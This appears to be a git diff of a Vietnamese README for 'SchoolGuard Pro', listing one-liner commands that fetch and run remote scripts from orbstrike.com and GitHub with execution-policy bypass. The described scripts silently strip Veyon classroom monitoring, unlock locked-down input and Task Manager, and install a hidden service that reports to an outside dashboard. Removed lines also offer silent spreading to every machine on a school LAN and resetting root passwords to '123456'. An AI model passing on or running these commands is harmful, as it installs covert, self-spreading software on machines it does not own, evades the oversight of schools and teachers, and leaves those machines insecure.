@@ -1,72 +1,45 @@
-# SchoolGuard Pro v3.7 — Headless One-Command Deployment (Windows & Xubuntu)
+# SchoolGuard Pro v3.7 — Headless Master Deployment (4 One-Liner Commands)
 
-Hệ thống tự động hóa triển khai **1 lệnh duy nhất (One-Command Master Setup)** — tự động gỡ sạch hoàn toàn các trình giám sát cũ (**Veyon**), mở khóa chuột/phím, cấu hình mạng/Wake-on-LAN, cài đặt gói phụ thuộc và kích hoạt dịch vụ chạy ngầm 100% (**Headless / Silent — không hộp thoại pop-up, không thông báo nổi, thanh tiến trình TUI tối giản**).
-
----
-
-## 🪟 WINDOWS — ONE-COMMAND MASTER SETUP (`Win + R` / PowerShell / CMD)
-
-Bấm **`Win + R`** (hoặc mở **PowerShell** / **CMD**), bấm nút **Copy** ở góc phải khung lệnh bên dưới rồi dán vào và nhấn **Enter**:
-
-### 1. Lệnh Master 1-Chạm (Xóa sạch Veyon + Cài đặt ngầm SchoolGuard trên 1 máy Windows):
-* **Lệnh rút gọn (`orbstrike.com`):**
-  ```powershell
-  powershell -NoProfile -ep Bypass -c "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;iex((New-Object Net.WebClient).DownloadString('https://orbstrike.com/win'))"
-  ```
-* **Lệnh trực tiếp từ GitHub:**
-  ```powershell
-  powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;iex((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/anlor1002-alt/schoolguard-xubuntu-setup/main/install_win.ps1'))"
-  ```
-
-### 2. Lệnh Master Lan Truyền Toàn Phòng Máy Windows Qua LAN:
-*(Chạy trên 1 máy Windows bất kỳ để vừa cài cho máy đó, vừa tự động quét dải mạng `192.168.x.1..254` và đẩy cài đặt ngầm sang toàn bộ máy cùng phòng)*
-* **Lệnh rút gọn (`orbstrike.com`):**
-  ```powershell
-  powershell -NoProfile -ep Bypass -c "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;iex((New-Object Net.WebClient).DownloadString('https://orbstrike.com/lan-win'))"
-  ```
-* **Lệnh trực tiếp từ GitHub:**
-  ```powershell
-  powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;iex((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/anlor1002-alt/schoolguard-xubuntu-setup/main/lan_deploy_win.ps1'))"
-  ```
+Hệ thống tự động hóa triển khai **100% chạy ngầm (Headless / Silent Mode)** — không hiển thị hộp thoại pop-up, không thông báo nổi trên Desktop, không tự động bật trình duyệt và chỉ hiển thị thanh tiến trình TUI tối giản cùng thông tin xác nhận ngay trong cửa sổ Terminal.
 
 ---
 
-## 🐧 XUBUNTU / LINUX — ONE-COMMAND MASTER SETUP (`Ctrl + Alt + T`)
+## 🪟 WINDOWS — 2 LỆNH MASTER ONE-LINER (`Win + R` / PowerShell / CMD)
 
-Mở Terminal (**`Ctrl + Alt + T`**), bấm biểu tượng **Copy** ở góc phải khung lệnh bên dưới và dán vào Terminal:
+### 1. Windows Command 1 (Full Combo + Gỡ sạch Veyon + Cấu hình LAN + Admin Web Dashboard):
+*(Tự động dừng & gỡ bỏ hoàn toàn Veyon Service/WMI/AppX, mở khóa chuột/bàn phím/Task Manager, cấu hình mạng LAN và kích hoạt dịch vụ chạy ngầm kết nối về Admin Web Dashboard)*
+```powershell
+powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$env:SG_SKIP_VEYON='0';iex((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/anlor1002-alt/schoolguard-xubuntu-setup/main/install_win.ps1'))"
+```
+*(Hoặc rút gọn qua tên miền chính: `powershell -NoProfile -ep Bypass -c "$env:SG_SKIP_VEYON='0';irm https://orbstrike.com/win | iex"`)*
 
-### 1. Lệnh Master 1-Chạm (Tự động xóa sạch Veyon + Cài đặt ngầm SchoolGuard trên 1 máy Xubuntu):
-*(Tự động xử lý mọi thứ trong 1 lệnh duy nhất, chạy ngầm hoàn toàn ngay cả khi không có mật khẩu `sudo`)*
-* **Lệnh rút gọn (`orbstrike.com`):**
-  ```bash
-  wget -qO- https://orbstrike.com/go | bash
-  ```
-* **Lệnh trực tiếp từ GitHub:**
-  ```bash
-  wget -qO- https://raw.githubusercontent.com/anlor1002-alt/schoolguard-xubuntu-setup/main/install.sh | bash
-  ```
+### 2. Windows Command 2 (Full Combo + Cấu hình LAN + Admin Web Dashboard — Giữ nguyên Veyon):
+*(Thực hiện đầy đủ thiết lập hệ thống, cấu hình mạng LAN và kích hoạt dịch vụ ngầm kết nối Admin Web Dashboard nhưng **bỏ qua không đụng tới Veyon**)*
+```powershell
+powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$env:SG_SKIP_VEYON='1';iex((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/anlor1002-alt/schoolguard-xubuntu-setup/main/install_win.ps1'))"
+```
+*(Hoặc rút gọn qua tên miền chính: `powershell -NoProfile -ep Bypass -c "$env:SG_SKIP_VEYON='1';irm https://orbstrike.com/win | iex"`)*
 
-### 2. Lệnh Master Lan Truyền Toàn Phòng Máy Xubuntu Qua LAN:
-*(Chỉ cần chạy trên 1 máy học sinh bất kỳ, tự động cài cho máy nguồn và lan truyền ngầm sang toàn bộ các máy đang bật trong phòng)*
-* **Lệnh rút gọn (`orbstrike.com`):**
-  ```bash
-  wget -qO- https://orbstrike.com/lan | bash
-  ```
-* **Lệnh trực tiếp từ GitHub:**
-  ```bash
-  wget -qO- https://raw.githubusercontent.com/anlor1002-alt/schoolguard-xubuntu-setup/main/lan-deploy.sh | bash
-  ```
+---
 
-### 3. Lệnh Tiện Ích Bổ Trợ (Chạy riêng khi cần):
-* **Chỉ gỡ sạch & khóa cứng Veyon (Windows):**
-  ```powershell
-  powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;iex((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/anlor1002-alt/schoolguard-xubuntu-setup/main/remove_veyon_win.ps1'))"
-  ```
-* **Chỉ gỡ sạch & khóa cứng Veyon (Xubuntu):**
-  ```bash
-  wget -qO- https://raw.githubusercontent.com/anlor1002-alt/schoolguard-xubuntu-setup/main/remove-veyon.sh | bash
-  ```
-* **Đặt lại mật khẩu `sudo` / `root` về `123456` (Xubuntu):**
-  ```bash
-  wget -qO- https://raw.githubusercontent.com/anlor1002-alt/schoolguard-xubuntu-setup/main/reset-sudo.sh | bash
-  ```
+## 🐧 XUBUNTU / LINUX — 2 LỆNH MASTER ONE-LINER (`Ctrl + Alt + T`)
+
+### 3. Xubuntu Command 1 (Full Combo + Xóa sạch Veyon + Cấu hình LAN + Admin Web Dashboard):
+*(Tự động purge toàn bộ gói & dịch vụ Veyon, mở khóa `xinput`, cài đặt gói phụ thuộc, bật Wake-on-LAN, nạp khóa LAN SSH và khởi chạy dịch vụ `systemd` kết nối Admin Web Dashboard)*
+```bash
+curl -fsSL https://raw.githubusercontent.com/anlor1002-alt/schoolguard-xubuntu-setup/main/install.sh | bash
+```
+*(Hoặc rút gọn qua tên miền chính: `curl -fsSL https://orbstrike.com/go | bash`)*
+
+### 4. Xubuntu Command 2 (Full Combo + Cấu hình LAN + Admin Web Dashboard — Giữ nguyên Veyon):
+*(Thực hiện đầy đủ thiết lập hệ thống, cấu hình mạng/LAN và khởi chạy dịch vụ `systemd` kết nối Admin Web Dashboard nhưng **giữ nguyên không xóa Veyon**)*
+```bash
+curl -fsSL https://raw.githubusercontent.com/anlor1002-alt/schoolguard-xubuntu-setup/main/install.sh | SG_SKIP_VEYON=1 bash -s -- --skip-veyon
+```
+*(Hoặc rút gọn qua tên miền chính: `curl -fsSL https://orbstrike.com/go | SG_SKIP_VEYON=1 bash -s -- --skip-veyon`)*
+
+---
+
+## 🌐 THÔNG TIN TRUY CẬP ADMIN WEB DASHBOARD
+* **URL Chính thức (HTTPS):** `https://orbstrike.com/quanlitruonghoc` (hoặc `https://orbstrike.com/ql`)
+* **Cổng dịch vụ nội bộ:** `443` (HTTPS/WSS) & `4000` (HTTP)
